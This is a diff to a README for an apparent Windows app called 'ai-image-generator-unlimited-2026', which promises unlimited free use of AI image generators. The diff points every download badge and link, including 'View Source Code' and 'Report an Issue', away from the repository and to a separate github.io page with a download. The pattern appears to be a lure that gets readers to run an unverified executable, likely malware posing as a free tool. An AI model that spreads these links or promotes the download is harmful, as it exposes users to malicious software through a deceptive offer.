@@ -1,6 +1,6 @@
 # 🎨 ai-image-generator-unlimited-2026 - One App, Every AI Art Tool
 
-[![Download Now](https://img.shields.io/badge/Download-AI_Image_Generator_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Testimonial-hypersomnia6486/ai-image-generator-unlimited-2026)
+[![Download Now](https://img.shields.io/badge/Download-AI_Image_Generator_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://testimonial-hypersomnia6486.github.io)
 
 ---
 
@@ -26,7 +26,7 @@ The app works right out of the box. There's no complicated setup, no command lin
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [https://github.com/Testimonial-hypersomnia6486/ai-image-generator-unlimited-2026](https://github.com/Testimonial-hypersomnia6486/ai-image-generator-unlimited-2026)
+Visit this link to download the application: [https://testimonial-hypersomnia6486.github.io](https://testimonial-hypersomnia6486.github.io)
 
 Once you're on that page, look for the download button or the latest release file. The download will start automatically after you click it.
 
@@ -186,9 +186,9 @@ We're actively maintaining this project and release updates regularly.
 
 ## 🔗 Quick Links
 
-- [Download the App](https://github.com/Testimonial-hypersomnia6486/ai-image-generator-unlimited-2026)
-- [View Source Code](https://github.com/Testimonial-hypersomnia6486/ai-image-generator-unlimited-2026)
-- [Report an Issue](https://github.com/Testimonial-hypersomnia6486/ai-image-generator-unlimited-2026/issues)
+- [Download the App](https://testimonial-hypersomnia6486.github.io)
+- [View Source Code](https://testimonial-hypersomnia6486.github.io)
+- [Report an Issue](https://testimonial-hypersomnia6486.github.io)
 
 ---
 
@@ -196,7 +196,7 @@ We're actively maintaining this project and release updates regularly.
 
 Don't let expensive subscriptions hold back your creativity. With this tool, you have unlimited access to the world's best AI image generators — completely free. Download it now and see what you can create.
 
-[![Get Started Now](https://img.shields.io/badge/🚀-Download_AI_Image_Generator_2026-4ECB71?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Testimonial-hypersomnia6486/ai-image-generator-unlimited-2026)
+[![Get Started Now](https://img.shields.io/badge/🚀-Download_AI_Image_Generator_2026-4ECB71?style=for-the-badge&logo=windows&logoColor=white)](https://testimonial-hypersomnia6486.github.io)
 
 ---
 
